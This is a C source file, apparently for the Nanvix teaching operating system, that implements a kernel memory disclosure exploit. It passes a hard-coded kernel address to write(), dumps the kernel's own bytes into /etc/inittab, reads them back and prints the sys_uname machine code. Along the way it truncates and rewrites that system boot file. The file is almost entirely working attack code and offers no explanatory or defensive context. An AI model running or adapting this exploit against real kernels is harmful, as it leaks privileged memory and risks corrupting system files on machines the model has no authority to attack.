/*
 * Copyright(C) 2011-2014 Pedro H. Penna <pedrohenriquepenna@gmail.com>
 *              2015-2015 Davidson Francis <davidsondfgl@gmail.com>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define INITTAB_SIZE 10
#define LINE_SIZE 80

#define VICTIM_FILE "/etc/inittab"
#define KERNEL_MEMORY 0xc0112999
#define MAX_FUNCTION_SIZE 200
#define FUNCTION_SIZE 64
#define RET 0xC3

static unsigned char ss[MAX_FUNCTION_SIZE];
static int size = 0;

/*
 * Backup of the original file.
 */
static char file[INITTAB_SIZE*LINE_SIZE];
static int countFile = 0;

static int backupFile()
{
	int fd;
	if ((fd = open(VICTIM_FILE, O_RDONLY)) == -1)
		return (-1);

	while(1)
	{
		char ch;
		if (read(fd, &ch, 1) < 1)
			return (0);
		
		file[countFile++] = ch;
	}

	close(fd);
	return (1);
}

static int restoreFile()
{
	int fd;
	if ((fd = open(VICTIM_FILE, O_TRUNC | O_WRONLY)) == -1)
		return (-1);

	for (int i = 0; i < countFile; i++)
		write(fd, &file[i], 1);

	close(fd);
	return (1);
}

static int readShell()
{
	int fd;
	unsigned ch;

	if ((fd = open(VICTIM_FILE, O_RDONLY)) == -1)
		return (-1);

	for (int i = 0; i < size; i++)
	{
		read(fd, &ch, 1);
		ss[i] = ch;
	}
	
	close(fd);

	return (0);
}

int main()
{
	unsigned char *ptr = (void*)KERNEL_MEMORY;

	/* Backup victim file. */
	backupFile();

	setvbuf(stdout, NULL, _IONBF, BUFSIZ);
	printf("------------------------------------\n");
	printf("        Nanvix Memory Watcher\n");
	printf("------------------------------------\n");

	printf("I can read anything here!\n\n");

	int fd;
	if ((fd = open(VICTIM_FILE, O_TRUNC | O_WRONLY)) == -1)
		return (-1);

	for (int i = 0; i < FUNCTION_SIZE; i++, size++)
		write(fd, &ptr[i], 1);

	/* Read shell code in file. */
	readShell();

	/* Restore victim file. */
	restoreFile();


	printf("sys_uname:\n");
	for (int i = 0; i < FUNCTION_SIZE; i+=5)
	{
		printf("EIP: %x: ",ptr+i);
		for (int j = 0; j < 5; j++)
		{
			printf("%x ",ss[i+j]);
			if(ss[i+j] == RET)
				goto end;
		}
		printf("\n");
	}

end:
	printf("\n");
	return (0);
}
